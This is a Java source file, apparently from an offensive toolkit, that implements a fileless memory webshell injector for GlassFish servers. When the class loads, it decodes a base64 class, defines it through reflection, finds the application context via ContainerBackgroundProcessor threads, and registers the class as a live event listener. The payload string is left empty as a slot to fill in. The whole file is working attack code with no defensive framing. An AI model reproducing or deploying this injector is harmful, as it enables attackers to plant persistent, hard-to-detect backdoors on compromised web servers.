package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;
import java.util.List;

public class GlassFishListenerMemShell {
    static {
        Inject();
    }

    public GlassFishListenerMemShell() {
        Inject();
    }

    public static synchronized void Inject() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            String ListenerBase64 = "";
            byte[] ListenerClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            EventListener listenerObject = (EventListener) listenerClass.newInstance();

            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field f1 = threadGroup.getClass().getDeclaredField("threads");
            f1.setAccessible(true);
            Thread[] threads = (Thread[]) f1.get(threadGroup);

            for (Thread thread : threads) {
                try {
                    char[] chararray = (char[]) getFV(thread, "name");
                    String chars = String.valueOf(chararray);

                    if (chars.contains("ContainerBackgroundProcessor") && chars.matches(".*StandardContext\\[/.+\\]")) {
                        Object target = getFV(thread, "target");
                        Object this0 = getFV(target, "this$0");

                        Method m2 = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod("getApplicationEventListeners");
                        m2.setAccessible(true);
                        List<EventListener> eventlisteners = (List<EventListener>) m2.invoke(this0);
                        eventlisteners.add(listenerObject);
                    }
                } catch (Exception e) {
                }
            }
        } catch (Exception e) {

        }
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
